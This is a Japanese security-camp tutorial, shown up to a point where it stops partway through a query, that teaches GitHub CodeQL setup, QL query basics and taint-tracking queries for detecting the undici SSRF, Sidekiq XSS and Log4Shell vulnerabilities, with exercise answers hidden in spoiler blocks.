![](https://tyage.github.io/seccamp-2023-images/upload_23a3220ac1c234de2d1ffc817525ee55.png)

### BugBounty💰💰💰

CodeQLのルールは主にGitHub（や買収されたSemmle社）の人々が書いたものですが、コミュニティでも貢献することができます。
(CodeQLを改善すると世界中のGitHub上のコードで自動的に脆弱性が見つかるかも...?)

[BugBountyプログラム](https://securitylab.github.com/bounties/)があり、2種類のどちらかをやるとお金がもらえます💰💰💰

- CVEになってる脆弱性を検知できるようにCodeQLをいい感じに改善
- CodeQLを使って脆弱性見つけてCVEを複数獲得

気前よく $1000 ~ $6000 の範囲で支払われているのでオススメ。
（私もこの前ちょっともらった）

支払いの様子: https://hackerone.com/github-security-lab/hacktivity

## CodeQLクエリを書いてみよう

CodeQLではQLという言語でクエリを記述します。
(ソースコードのデータベースに対する検索クエリなので、SQLのイメージが近いかも)

### (事前課題) セットアップ

VS Code拡張を今回は利用します。

[Setting up CodeQL in Visual Studio Code](https://codeql.github.com/docs/codeql-for-visual-studio-code/setting-up-codeql-in-visual-studio-code/)

Step1. VS CodeにCodeQL Extensionをインストール
https://marketplace.visualstudio.com/items?itemName=GitHub.vscode-codeql
![](https://tyage.github.io/seccamp-2023-images/upload_52ad5dac9514a674b594138655adec5e.png)

Step2. vscode-codeql-starter リポジトリを git clone

```
$ git clone https://github.com/github/vscode-codeql-starter
```

Step3. リポジトリのsubmoduleをダウンロード

```
$ cd vscode-codeql-starter
$ git submodule update --init --remote
```

Step4. VS Codeで`File > Open Workspace` からフォルダ内の `vscode-codeql-starter.code-workspace` を選択
(日本語だと `ファイル > ファイルでワークスペースを開く`)

Step5. CodeQL CLIがインストールされてない場合、適当に `example.ql` とかを開くとインストールが始まる
(Linux arm64環境の人は降ってくるJavaを差し替える必要があるかも...)

Step6. VS Code Command `CodeQL: Install Pack Dependencies` を実行して、CodeQLの公式ライブラリをインストール
![](https://tyage.github.io/seccamp-2023-images/upload_8a686f0a4f930166304abfa309dcba66.png)
![](https://tyage.github.io/seccamp-2023-images/upload_85f9a9ab7c5e7033a3e3c08c954f1581.png)

Step7. `codeql-custom-queries-javascript/example.ql` 等を開いてエラーが起きている場合には VS Code Command `Reload Window` を実行

![](https://tyage.github.io/seccamp-2023-images/upload_72e3969fe3394f659733f4a87620be52.png)

これでセットアップは完了です！

### (事前課題) クエリを試してみる

実際にCodeQLでソースコードで検索が行えるか試してみましょう。

ここでは試しに、nanoidという小さいライブラリを利用して、クエリを実行してみます
nanoid: ランダムなIDを生成するライブラリ

Step1. サイドバーのCodeQL拡張を選択し、　 `DATABASES > From GitHub` で `https://github.com/ai/nanoid` を入力しデータベースをダウンロード

![](https://tyage.github.io/seccamp-2023-images/upload_46df08d4961d6e92fd84d626654e208c.png)

Step2. `codeql-custom-queries-javascript` ワークスペースに `test.ql` を作成

test.ql
```javascript
select "hello world"
```

Step3. VS Code Command `CodeQL: Run Query on Selected Database` を実行

Step4. `hello world` が `CodeQL Query Results` に表示される

![](https://tyage.github.io/seccamp-2023-images/upload_8601c2c3114c916847050d665f34af4e.png)

Step5. `test.ql` を書き換え

test.ql
```javascript
import javascript

from MethodCallExpr e
where e.getMethodName() = "allocUnsafe"
select e, "allocUnsafe method call"
```

Step6. 実行すると `allocUnsafe` メソッドが呼び出される箇所が表示されます

![](https://tyage.github.io/seccamp-2023-images/upload_684f3193cfb87794c2c042a5b944a573.png)

余裕がある人は `https://github.com/misskey-dev/misskey` のデータベースを追加して `codeql-custom-queries-javascript/example.ql` を実行してみてください。

Misskeyのソースコードの中で、実行するものがない空のブロック（`{}`）があるか検索できます。

### うまく動かなかった時

手元のマシンでメモリ不足などが原因で動作しない、動作が遅いときはGitHub Codespaces上で作業をお願いします。
（不安な方は最初からそっちでやってもらったほうがいいかも）

ビルド済みのCodespacesを用意しています。
以下のURLから起動すると、上記の準備を実施済みの環境がブラウザ上で立ち上がるはずです。
（※講義終了後しばらくしたらCodespaces環境は止まると思うのでご注意を。）

追記: Machine typeは8-core以上推奨

https://github.com/codespaces/new?skip_quickstart=true&machine=premiumLinux&repo=675891091&ref=main&geo=SoutheastAsia&devcontainer_path=.devcontainer%2Fdevcontainer.json

### CodeQLクエリの基礎

公式チュートリアル: [Introduction to QL](https://codeql.github.com/docs/writing-codeql-queries/introduction-to-ql/)

CodeQLのクエリは `select "hello world"` のようにSQLに近い見た目をしていますが、変数宣言やクラス、クラスの継承などがありそういった面では一般的なプログラミング言語に近いです。

クエリの基本形

```javascript
from /* ... 変数宣言 ... */
where /* ... 条件 ... */
select /* ... 評価式 ... */
```

6*7 を計算するクエリ

```javascript
from int x, int y // 変数x, yを宣言。それぞれint型
where x = 6 and y = 7 // x, yの条件を設定
select x, y, x * y // x*y を計算して出力
```

`where` で代入のようなことをしているように見えるので少し不思議かもしれません。
実際には、`where` がない状態では `x` は `int` の取りうる任意の値(... -1, 0, 1, 2, ...)を表しており、 `where x = 6` で `x` を6に束縛するというイメージです。

`x` を複数の値に束縛することもできます。

1\*7, 3\*7, 5\*7, 7\*7 を計算するクエリ
Pythonで書けばこんなイメージ？ `[x*y for x in [1,3,5,7] for y in [7]]`

```javascript
from int x, int y
where x in [1, 3, 5, 7] and y = 7
select x, y, x * y
```

`x = y` のように変数同士を束縛することもできます。
下では 1\*1 と 3\*3 が計算されます。

```javascript
from int x, int y
where x in [1, 3, 5, 7] and y in [1, 2, 3] and x = y
select x, y, x * y
```

以下のようなクエリは実行できません。xが無限にあるため。

```javascript
from int x, int y
where y = 7
select x, y, x * y
```

classを定義することで、それが型になります。また、int, string, booleanのようなprimitiveな型を継承したclassを作ることもできます。

```javascript
class OneTwoThree extends int {
  OneTwoThree() { this = [1 .. 3] }
}

from OneTwoThree num
select num
```

CodeQLで利用できる演算子や構文をいくつかピックアップしてみました。


|            | 例                   | 解説              |
| ---------- | -------------------- | ----------------- |
| <          | A < B                | 比較演算子        |
| >          | A > B                | 比較演算子        |
| <=         | A <= B               | 比較演算子        |
| >=         | A >= B               | 比較演算子        |
| =          | A = B                | 比較演算子        |
| !=         | A != B               | 比較演算子        |
| instanceof | A instanceof TYPE    | A の型が TYPE     |
| in         | A in RANGE           | A が RANGE の範囲 |
| not        | not A                | 条件否定          |
| and        | A and B              | 論理積            |
| or         | A or B               | 論理和            |
| if         | if A then B else C   | 条件文            |
| class      | class A extends B {} | クラス定義        |

(ちなみに少しややこしいことに `not A = B` と `A != B` で意味が違います...)

その他、CodeQL特有の言語仕様は[QL language reference](https://codeql.github.com/docs/ql-language-reference/)を参照するとよいです。

### ソースコードに対するクエリ

事前準備で使用したクエリに戻ってみましょう。

```javascript
import javascript

from MethodCallExpr e
where e.getMethodName() = "allocUnsafe"
select e, "allocUnsafe method call"
```

CodeQLクエリについての解像度はなんとなく上がったかと思うのですが、まだ分からない箇所がいくつかあると思います。
一つずつ解説します。

#### `import javascript`

CodeQLでは、言語ごとにライブラリが用意されているため、クエリを書く場合はそれを利用することになります。
(事前課題で、`CodeQL: Install Pack Dependencies` というコマンドでインストールしたのが、そのライブラリです。)

`import javascript` によって、CodeQLのJavaScript + TypeScriptライブラリを使用することができるようになります。

公式言語別ガイド: [CodeQL language guides](https://codeql.github.com/docs/codeql-language-guides/)

結果として、クエリも言語別に書くことになります。
また、データベースも言語ごとに生成されています。（一つのリポジトリで言語別に複数のデータベースが生成されます。）

#### `from MethodCallExpr e`

CodeQLでは、ソースコードの抽象構文木(AST)というツリーをデータベースに保管しています。
(プログラミング言語のパーサやコンパイラを書いたことがある人は触れたことがあるはず)
CodeQLクエリを書くときは、ASTの各ノードや、ノードからノードへのパスを探索していきます。

ASTはすごく大雑把に言えばプログラムの文法表現を木構造に落としたものですが、実際に見たほうが分かりやすいと思うので見てみましょう。

VSCodeのエクスプローラから ai/nanoid　の index.js に対して右クリック > CodeQL: View ASTを実行するとソースコードのASTが表示されます。
(初回は実行に時間かかるかも)

![](https://tyage.github.io/seccamp-2023-images/upload_97a5329e01fb86643ef199503096a925.png)

![](https://tyage.github.io/seccamp-2023-images/upload_bb68ce29639def1f4e28a7cfa6cf4ce3.png)

`Buffer.allocUnsafe(...)` の `allocUnsafe` を押すと、AST Viewerが該当のノードを表示してくれます。

![](https://tyage.github.io/seccamp-2023-images/upload_f6a7a5031156f909c235313a2540a8cd.png)

こんな構造になっていると思います

```
[MethodCallExpr] Buffer. ... IPILER)
 |--[DotExpr] Buffer.allocUnsafe
 |    |--[VarRef] Buffer
 |    L--[Label] allocUnsafe
 L--(Arguments)
```

`MethodCallExpr` はメソッド呼び出しを指すASTノードです。

その下に2つ子ノードがぶら下がっていると思います。
(ツリー構造なので、 `MethodCallExpr` を親ノード、 その下の2つを子ノードと表現します。)

1つ目がメソッド `Buffer.allocUnsafe` に当たる `DotExpr` というASTノードで、　これもまた`VarRef`　と `Label` の子ノードがあります。
2つ目がメソッド呼び出しの引数部分を表すASTノードになります。

AST Viewerやソースコードをクリックしながら見てみると分かりやすいかも。

[CodeQL language guides](https://codeql.github.com/docs/codeql-language-guides/)プログラミング言語別に構文に対応するASTノードの一覧表があるので、困ったときはここを参照。
- [JavaScript/TypeScript](https://codeql.github.com/docs/codeql-language-guides/abstract-syntax-tree-classes-for-working-with-javascript-and-typescript-programs/)
- [Ruby](https://codeql.github.com/docs/codeql-language-guides/abstract-syntax-tree-classes-for-working-with-ruby-programs/)
- [Java/Kotlin](https://codeql.github.com/docs/codeql-language-guides/codeql-for-java/)


本題に戻ると、 `from MethodCallExpr e` というのは、メソッド呼び出しのASTノードの宣言ということになります。

#### `where e.getMethodName() = "allocUnsafe"`

`e.getMethodName()` は `MethodCallExpr` のメソッド名部分を取ってくる述語（関数みたいなもの）です。

このwhere文によって、 `e` が `allocUnsafe` メソッドのメソッド呼び出しのみに限定されます。

#### 再度確認

このクエリで、 `allocUnsafe` メソッドの呼び出しを抽出していることがわかったでしょうか？
（このクエリだとメソッド名が `allocUnsafe` であればなんでも出てきてしまうので、 `Buffer.allocUnsafe` を探したい場合にはもう少しクエリを書く必要がありますが）

```javascript
import javascript

from MethodCallExpr e
where e.getMethodName() = "allocUnsafe"
select e, "allocUnsafe method call"
```

※試す場合、クエリ実行対象のデータベースで「ai/nanoid」が選択されていることを確認!

![](https://tyage.github.io/seccamp-2023-images/upload_afa7fa983c5f6500c4bdbc56f5ced435.png)

このようにして特定の関数呼び出しや変数の宣言、構文パターンを抽出することができます。
（今回はVS Code上で確認していますが、SARIFという静的解析結果用の標準出力フォーマットでファイルに書き出すこともできます。）

が、Taint Trackingを行うにはDataFlowという仕組みを利用する必要があります。
DataFlowを利用して、前半で調査したCVEを検知するクエリを書いてみよう。

# CodeQL実践編

## (JavaScript) CVE-2022-35949

データベースはこちらで作成したものがあるので、それを追加してみてください。
https://drive.google.com/file/d/1z7M_zgaaop7cQGhJDqueqDuC448hSLFB/view?usp=sharing

`new URL` を利用したSSRFが発生する箇所を特定してみましょう。

そのために、CodeQLでTaint Trackingをやっていきます。


以下のJavaScript用Taint Trackingテンプレートを利用すると出力がいい感じになって便利です。(コメントも重要なので消さないで！)

```javascript
/**
 * @kind path-problem
 */
import javascript
import DataFlow
import DataFlow::PathGraph

class MyConfig extends TaintTracking::Configuration {
  MyConfig() { this = "MyConfig" }
  override predicate isSource(Node node) { ... }
  override predicate isSink(Node node) { ... }
}

from MyConfig cfg, PathNode source, PathNode sink
where cfg.hasFlowPath(source, sink)
select sink.getNode(), source, sink, "taint from $@.", source.getNode(), "here"
```

各パーツをざっくりと説明すると

- `class MyConfig extends TaintTracking::Configuration {`
    - Taint Tracking用の設定を記述するクラス
- `override predicate isSource(Node node) { ... }`
    - 引数 `node` がソース🚰であるか判断するpredicate(述語)
    - predicate = ほぼ関数みたいなもの
        - return文が無い代わりに、 `result = ...` とするとそれが返り値になる
- `override predicate isSink(Node node) { ... }`
    - 引数 `node` がシンク🪣であるか判断するpredicate(述語)

テンプレート内の `...` に適切な論理条件を書いていきましょう。

大きな注意点として、Taint Trackingで扱う `node` はAST Nodeとは別のDataFlowモジュールのNodeクラスです。
DataFlow Nodeは `.asExpr()` を実行することでAST Nodeへ変換することが可能ですが、DataFlowモジュールで用意されているクラスで表現できる場合にはそのほうがいいでしょう。
(さらに混乱するポイントとして、DataFlow Node -> AST Nodeへの変換方法は言語によって違います。)

[Data flow cheat sheet for JavaScript](https://codeql.github.com/docs/codeql-language-guides/data-flow-cheat-sheet-for-javascript/)

### exists構文

まずは `isSink` の内容から考えてみましょう。

`node` は `new URL(...)` の第一引数になってほしいので、 `new XXXX` を表す `NewNode` を利用するとうまく表現できそうです。
( [NewNode](https://codeql.github.com/codeql-standard-libraries/javascript/semmle/javascript/dataflow/Nodes.qll/type.Nodes$NewNode.html) は AST Node ではなく DataFlowモジュールの Nodeです。 )

先程までの from ... select 構文を用いて `node` の候補を抽出する構文はこう書けると思います。

```javascript
from NewNode newNode
where newNode.getCalleeName() = "URL"
select newNode.getArgument(0)
```

predicate内で `node` を束縛するにはどうしたらいいでしょうか？

ここで、 `exists(変数宣言 | 条件)` という構文が登場します。

これを使うと変数宣言部分で宣言した変数を用いて、条件が成立するものがあるかどうか調べることができます。
先程の from ... select 文を思い出しながら書いてみると、こう書くことができます。

```javascript
...
  // ... のままだと構文エラーになるので、任意の値を表す any() をとりあえず入れておきます
  override predicate isSource(Node node) { any() }

  override predicate isSink(Node node) {
    exists(NewNode new |
      node = new.getArgument(0) and // node = new XXXX(...)
      new.getCalleeName() = "URL" // XXXX = "URL"
    )
  }
...
```

`Quick Evaluation: isSink` を押してみると `new URL` の引数が表示されるはずです。
これで `node` = `new URL(...)` の第一引数となりました。

### 課題4: シンク🪣を改良してみよう
単に `new URL(url)` が呼び出されている箇所は、意図しないoriginの上書きが発生しないのでシンク🪣としてはあまり適切ではありません。
`new URL(param, origin)` のように第一引数に外部入力値が入り、第二引数も設定されている場所を探してみましょう。


<details>
<summary>答え</summary>


```javascript
  override predicate isSink(Node node) {
    exists(NewNode new |
      node = new.getArgument(0) and // node = new XXXX(...)
      new.getCalleeName() = "URL" and // XXXX = "URL"
      new.getNumArgument() > 1
     )
  }
```

別解

```javascript
    exists(NewNode new, Node arg2 |
      node = new.getArgument(0) and // node = new XXXX(..., YYYY)
      new.getCalleeName() = "URL" and // XXXX = "URL"
      new.getArgument(1) = arg2 // YYYY = arg2
    )
```
</details>


### 課題5: ソース🚰を書いてみよう

`isSource` についても同様に定義してみましょう。

本来であれば `request({ opts: req.params... })` のような外部入力パラメータをソース🚰とすべきですが、ここでは簡略化して、undiciの `index.js` の37行目で定義されてるアロー関数の引数、 `url` と `opts` をライブラリ外部から与えられる信頼できない値としてソース🚰に設定してみましょう。

https://github.com/nodejs/undici/blob/124f7ebf705366b2e1844dff721928d270f87895/index.js#L37

任意の関数の引数名 `url` もしくは `opts` がソース🚰となるように `isSource` に条件を設定してみてください。
`Quick Evaluation: isSource` をクリックして `114 results` が返ってくれば正解です。

ヒント1: 関数を表すNodeとして[FunctionNode](https://codeql.github.com/codeql-standard-libraries/javascript/semmle/javascript/dataflow/Nodes.qll/type.Nodes$FunctionNode.html)が存在します。
ヒント2: `FunctionNode`には`getParameter`や`getParameterByName`のような関数の引数を取得する述語があります。

<details>
<summary>答え</summary>

```javascript
/**
 * @kind path-problem
 */

import javascript
import DataFlow
import DataFlow::PathGraph

class MyConfig extends TaintTracking::Configuration {
  MyConfig() { this = "MyConfig" }

  override predicate isSource(Node node) {
    exists(FunctionNode f |
      f.getParameterByName("opts") = node or
      f.getParameterByName("url") = node
    )
  }

  override predicate isSink(Node node) {
    exists(NewNode new |
      new.getArgument(0) = node and
      new.getCalleeName() = "URL" and
      new.getNumArgument() > 1
    )
  }
}

from MyConfig cfg, PathNode source, PathNode sink
where cfg.hasFlowPath(source, sink)
select sink.getNode(), source, sink, "taint from $@.", source.getNode(), "here"
```

</details>

### Taint Trackingをやってみよう

完成したクエリを走らせてみましょう。

ソース🚰からシンク🪣までのフローが存在するものだけが抽出され、Query Resultでフローを追うことができるようになっているはずです。

![](https://tyage.github.io/seccamp-2023-images/upload_979e9c158bb23a57d509bac5b45091d5.png)


## (Ruby) CVE-2023-1892

静的解析のパートでSidekiqのXSS(CVE-2023-1892)についてのソースとシンクが分かったのでCodeQLのクエリを作成して検知してみよう

データベースファイル
https://drive.google.com/file/d/1Y6MGyRP2jnu6h8WR14ZmZyBszEqa6OP3/view?usp=drive_link

### 課題6: クエリを実装してみよう

構文のリファレンス
https://codeql.github.com/docs/ql-language-reference/

ソース: `params[:period]`
シンク: `<%= @period %>`

ソースを抽出するクエリを書くまえにソースのノードについて調べる

sidekiq/lib/sidekiq/web/application.rbに対して右クリック > CodeQL: View ASTを実行するとソースコードのASTについて調べることができる

![](https://tyage.github.io/seccamp-2023-images/upload_594555d3f0d274e229413ee4fe0d164b.png)

![](https://tyage.github.io/seccamp-2023-images/upload_1817d4914e66c31fcc6e6a15573309ee.png)

`params[:period]`は`ElementReference`ノードであり、さらにその下のparamsはMethodCallノードであることがわかる
![](https://tyage.github.io/seccamp-2023-images/upload_a57066f2ce385e2bc77b21b47d44cc11.png)

ちなみにrubyのAST viewerは親ノードから子ノードにアクセスするメソッドがわかる
```
getStmt: [ClassDeclaration] WebApplication
 L-- getStmt: [MethodCall] call to extend
  L-- getStmt: [AssignExpr] ... = ...
```

```
import ruby
import codeql.ruby.AST

from ClassDeclaration cd

where cd.getName() = "WebApplication"
select cd, cd.getStmt(0)
```

![](https://tyage.github.io/seccamp-2023-images/upload_a00cb24aa1a897759db8c137ec5dd734.png)


```
import ruby
import codeql.ruby.AST

from ElementReference ref, MethodCall call
where ref.getReceiver() = call and
    call.getMethodName() = "params" 
select call, call.getMethodName()
```

![](https://tyage.github.io/seccamp-2023-images/upload_b72445d34b9db2c0fada2b8ca9f4c4d2.png)

同じ要領でシンクを抽出するクエリを作成する

以下の点を踏まえてクエリを作成
・シンクはerbの出力箇所(`<%= %>`)
・`@period`(InstanceVariableAccessノード)が出力対象

erbの出力箇所はErbOutputDirectiveを使うと良い
https://codeql.github.com/codeql-standard-libraries/ruby/codeql/ruby/ast/Erb.qll/type.Erb$ErbOutputDirective.html

```
import ruby
import codeql.ruby.AST

from ErbOutputDirective erbOutputDirective

where erbOutputDirective.getTerminalStmt() instanceof InstanceVariableAccess
select erbOutputDirective
```

![](https://tyage.github.io/seccamp-2023-images/upload_985828f66fc68189c3c3109628c84aa4.png)

ソースからシンクまでのデータの流れを検知するためには`TaintTracking::Configuration`を継承したクラスを定義する

```
/**
 * @kind path-problem
 */
import ruby
import codeql.ruby.AST
import codeql.ruby.DataFlow
import codeql.ruby.TaintTracking
import DataFlow::PathGraph

class Configuration extends TaintTracking::Configuration {

  // 引数のノードがソースとなるように実装
  override predicate isSource(DataFlow::Node source) {
    // ソースを定義
  }
    
  // 引数のノードがシンクとなるように実装
  override predicate isSink(DataFlow::Node sink) {
    // シンクを定義
  }

}

from DataFlow::PathNode src, DataFlow::PathNode sink, Configuration config
where config.hasFlowPath(src, sink)
select sink.getNode(), src, sink, "Detected CVE-2023-1892!"

```

これまで実装したソースとシンクのクエリをそれぞれのメソッドで実装してソースとシンクを特定しよう
「Quick Evaluation: isSource」をクリックするとそのメソッドだけ実行できるので活用しよう

![](https://tyage.github.io/seccamp-2023-images/upload_40e83426b9827184107c2a410d7e0afa.png)

```
class Configuration extends TaintTracking::Configuration {
  Configuration() { this = "CVE-2023-1892" }

  /*
    sidekiq/lib/sidekiq/web/application.rb:71
    @period = params[:period]

    sidekiq/lib/sidekiq/web/application.rb:80
    @period = params[:period]
  */
  override predicate isSource(DataFlow::Node source) {
    exists(ElementReference ref |
      ref.getReceiver().(MethodCall).getMethodName() = "params" and // params[:period]
      source.asExpr().getExpr() = ref // source: params[:period]
    )
  }

  /*
    sidekiq/web/views/metrics.erb:65
    <%= @period %>

    sidekiq/web/views/metrics_for_job.erb:65
    <%= @period %>
  */
  override predicate isSink(DataFlow::Node sink) {
    exists(ErbOutputDirective erb |
      sink.asExpr().getExpr() = erb.getTerminalStmt() // <%= @period<-ココ %>
    )
  }

}
```

ただし、このままだとerb(:metrics_for_job)などのcontrollerからview(erbファイル)に対するフローが無いため検知できない。

そのため、`isAdditionalTaintStep()`でcontrollerからviewへのフローを定義する
isAdditionalTaintStepではnode1, node2のように引数を二つ取り、node1からnode2に対するデータフローを定義することができる

まずは広い範囲を指定して取得していき、だんだんとスコープを絞っていくと作りやすいかも


<details>
<summary>!!Spoiler Alert!!</summary>

実装一例
```
  // @period = params[:method]
  Expr variableAssignValue(string name) {
    exists(InstanceVariableAccess var, AssignExpr assignExpr |
      result = assignExpr and // node1: @period = params[:method]
      assignExpr.getLeftOperand() = var and // @period = ...
      var.getVariable().getName() = name // @period の name
    )
  }

  // <%= name %>
  InstanceVariableAccess erbOutputVariable(string name) {
    exists(ErbOutputDirective output |
      result.getVariable().getName() = name and // @period のname
      output.getTerminalStmt() = result // <%= @period %>
    )
  }
  /*
    (node1)params[:period] -> (node2) <%= @period<-これ %>
  */
  override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) {
    exists(string name |
      node1.asExpr().getExpr() = variableAssignValue(name) and // node1: params[:period]
      node2.asExpr().getExpr() = erbOutputVariable(name) // node2: <%= @period<-これ %>
    )
  }
```


```
/**
 * @kind path-problem
 */

import ruby
import codeql.ruby.AST
import codeql.ruby.DataFlow
import codeql.ruby.TaintTracking
import DataFlow::PathGraph


class Configuration extends TaintTracking::Configuration {
  Configuration() { this = "CVE-2023-1892" }

  /*
    sidekiq/lib/sidekiq/web/application.rb:71
    @period = params[:period]

    sidekiq/lib/sidekiq/web/application.rb:80
    @period = params[:period]
  */
  override predicate isSource(DataFlow::Node source) {
    exists(ElementReference ref |
      ref.getReceiver().(MethodCall).getMethodName() = "params" and // params[:period]
      source.asExpr().getExpr() = ref // source: params[:period]
    )
  }

  /*
    sidekiq/web/views/metrics.erb:65
    <%= @period %>

    sidekiq/web/views/metrics_for_job.erb:65
    <%= @period %>
  */
  override predicate isSink(DataFlow::Node sink) {
    exists(ErbOutputDirective erb |
      sink.asExpr().getExpr() = erb.getTerminalStmt() // <%= @period<-ココ %>
    )
  }

  // @period = ココ
  Expr variableAssignValue(string name) {
    exists(InstanceVariableAccess var, AssignExpr assignExpr |
      result = assignExpr.getRightOperand() and // node1: @period = ココ
      assignExpr.getLeftOperand() = var and // @period = ...
      var.getVariable().getName() = name // @period の name
    )
  }

  // <%= name %>
  InstanceVariableAccess erbOutputVariable(string name) {
    exists(ErbOutputDirective output |
      result.getVariable().getName() = name and // @period のname
      output.getTerminalStmt() = result // <%= @period %>
    )
  }

  /*
    (node1)params[:period] -> (node2) <%= @period<-これ %>
  */
  override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) {
    exists(string name |
      node1.asExpr().getExpr() = variableAssignValue(name) and // node1: params[:period]
      node2.asExpr().getExpr() = erbOutputVariable(name) // node2: <%= @period<-これ %>
    )
  }
}

from DataFlow::PathNode src, DataFlow::PathNode sink, Configuration config
where config.hasFlowPath(src, sink)
select sink.getNode(), src, sink, "Detected CVE-2023-1892!"

```

</details>

## (Java) Log4shell

### 課題7
* ソースとシンクのクエリを実装してください
* (難易度高)余裕があれば全部自分で実装してみてください

データベースを作成したものがあるのでそれを利用してください
https://drive.google.com/file/d/1eP5aZ_Pwa495yvAy_Aekb3gytQNtzgm1/view?usp=sharing

#### クエリのテンプレ
※ addiionalTaintStepが複雑なのでこちら側で実装していますが、全部自分で書きたい人は見ないでやってもいいです

<details>
<summary>!!Spoiler Alert!!</summary>

```
/**
 * @kind path-problem
 */
import java
import semmle.code.java.dataflow.DataFlow
import semmle.code.java.dataflow.TaintTracking
import DataFlow::PathGraph


class Test1TaintStep extends TaintTracking::AdditionalTaintStep {

    /*
      logging-log4j2/log4j-api/src/main/java/org/apache/logging/log4j/spi/AbstractLogger.java:1989
      messageFactory.newMessage(message)
      logging-log4j2/log4j-api/src/main/java/org/apache/logging/log4j/message/ReusableMessageFactory.java:94
      result.set(charSequence);
    */
    override predicate step(DataFlow::Node node1, DataFlow::Node node2) {
        exists( MethodAccess methodAccess, Method method | 
            methodAccess.getMethod() = method and // result.set(charSequence);
            method.getName() = "set" and 
            method.getNumberOfParameters() = 1 and // result.set(charSequence)の引数の数
            methodAccess.getEnclosingCallable().getDeclaringType().getName() = "ReusableMessageFactory" and // クラスがReusableMessageFactory
            node1.asExpr() = methodAccess.getArgument(0) and
            node2.asExpr() = methodAccess.getQualifier() // 汚染対象を(node1)messege -> (node2)result
        )
    }
}


class Test2TaintStep extends TaintTracking::AdditionalTaintStep {

  /*
    logging-log4j2/log4j-core/src/main/java/org/apache/logging/log4j/core/config/LoggerConfig.java:454
    ((LocationAwareLogEventFactory) logEventFactory).createEvent(loggerName, marker, fqcn, location, level, data, props, t)
    logging-log4j2/log4j-core/src/main/java/org/apache/logging/log4j/core/impl/ReusableLogEventFactory.java:100
    result.setMessage(message);
  */
  override predicate step(DataFlow::Node node1, DataFlow::Node node2) {
      exists( MethodAccess methodAccess, Method method | 
          methodAccess.getMethod() = method and // result.setMessage(message);
          method.getName() = "setMessage" and 
          method.getNumberOfParameters() = 1 and // setMessageメソッドの引数の数
          methodAccess.getEnclosingCallable().getDeclaringType().getName() = "ReusableLogEventFactory" and // クラスがReusableLogEventFactory
          node1.asExpr() = methodAccess.getArgument(0) and
          node2.asExpr() = methodAccess.getQualifier() // 汚染対象を(node1)message -> (node2)reult
      )
  }
}


class Configuration extends TaintTracking::Configuration {

  Configuration() { this = "log4shell" }

  /*
    logging-log4j2/log4j-api/src/main/java/org/apache/logging/log4j/spi/AbstractLogger.java:1299
    public void info(final CharSequence message)
  */
  override predicate isSource(DataFlow::Node source) {    
    ・・・
  }

  /*
    logging-log4j2/log4j-core/src/main/java/org/apache/logging/log4j/core/net/JndiManager.java:172
    return (T) this.context.lookup(name);
  */
  override predicate isSink(DataFlow::Node sink) { 
    ・・・
  }
}


from DataFlow::PathNode src, DataFlow::PathNode sink, Configuration config
where config.hasFlowPath(src, sink)
select sink.getNode(), src, sink, "Detected Log4shell!"

```

</details>


#### ソース:
https://github.com/apache/logging-log4j2/blob/rel/2.14.1/log4j-api/src/main/java/org/apache/logging/log4j/spi/AbstractLogger.java
```java
    @Override
    public void info(final CharSequence message) {
        logIfEnabled(FQCN, Level.INFO, null, message, null);
    }
```

#### シンク:
https://github.com/apache/logging-log4j2/blob/rel/2.14.1/log4j-core/src/main/java/org/apache/logging/log4j/core/net/JndiManager.java#L172C31-L172C31
```java
    public <T> T lookup(final String name) throws NamingException {
        return (T) this.context.lookup(name);
    }
```


AST viewerとドキュメントを見ながらクエリを作っていきましょう
![](https://tyage.github.io/seccamp-2023-images/upload_1c6b9e86e68459e932e1684abe90cf3d.png)

Method Module
https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Member.qll/type.Member$Method.html

<details>
<summary>!!Spoiler Alert!!</summary>
    
ソース
```
  override predicate isSource(DataFlow::Node source) {    
    exists( Method method |
        method.getName() = "info" and // info(CharSequence message)のメソッド名
        method.getNumberOfParameters() = 1 and // info(CharSequence message)の引数の数
        method.getParameterType(0).(RefType).hasQualifiedName("java.lang", "CharSequence") and // 引数の型がCharSequence
        source.asParameter() = method.getParameter(0) and //ソースをinfo(CharSequence message)の第一引数に指定
        method.getDeclaringType().getASourceSupertype+().hasQualifiedName("org.apache.logging.log4j", "Logger") // infoメソッドの呼び出し元クラスがorg.apache.logging.log4j.Logger
    )
  }
```

</details>
    
シンクも同様にAST viewerを見ながらクエリを作成していく
![](https://tyage.github.io/seccamp-2023-images/upload_98d55196a77f8dacb27a41c508c25562.png)

MethodAccess Module
https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Expr.qll/type.Expr$MethodAccess.html

<details>
<summary>!!Spoiler Alert!!</summary>

シンク
```
  override predicate isSink(DataFlow::Node sink) { 
    exists( MethodAccess methodAccess |
        methodAccess.getMethod().getName() = "lookup" and // context.lookup(name) のメソッド名
        methodAccess.getMethod().getNumberOfParameters() =  1 and // context.lookup(name)の引数の数
        methodAccess.getMethod().getDeclaringType().hasQualifiedName("javax.naming", "Context") and // lookupメソッドの呼び出し元クラスがjavax.naming.Context
        methodAccess.getAnArgument() = sink.asExpr() // シンクをcontext.lookup(name)の引数に指定
    )
  }
```

</details>

AdditionalTaintStepに付いての解説

<details>
<summary>!!Spoiler Alert!!</summary>

このままだと途中でtaint trackingが切れてしまうので、AdditionalTaintStepを実装する必要がある
実装の前にどこまでtrackingできているか確認する
sinkのスコープを広げてクエリを実行し、本来のsinkまでのステップがどこまで追えているか確認する

```
class Configuration extends TaintTracking::Configuration {

  Configuration() { this = "log4shell" }

  override predicate isSource(DataFlow::Node source) {    
    exists( Method method |
        method.getName() = "info" and // info(CharSequence message)のメソッド名
        method.getNumberOfParameters() = 1 and // info(CharSequence message)の引数の数
        method.getParameterType(0).(RefType).hasQualifiedName("java.lang", "CharSequence") and // 引数の型がCharSequence
        source.asParameter() = method.getParameter(0) and //ソースをinfo(CharSequence message)の第一引数に指定
        method.getDeclaringType().getASourceSupertype+().hasQualifiedName("org.apache.logging.log4j", "Logger") // infoメソッドの呼び出し元クラスがorg.apache.logging.log4j.Logger
    )
  }

  override predicate isSink(DataFlow::Node sink) { 
    exists( MethodAccess methodAccess |
        methodAccess.getMethod().getName() = "lookup" and // context.lookup(name) のメソッド名
        methodAccess.getMethod().getNumberOfParameters() =  1 and // context.lookup(name)の引数の数
        methodAccess.getMethod().getDeclaringType().hasQualifiedName("javax.naming", "Context") and // lookupメソッドの呼び出し元クラスがjavax.naming.Context
        methodAccess.getAnArgument() = sink.asExpr() // シンクをcontext.lookup(name)の引数に指定
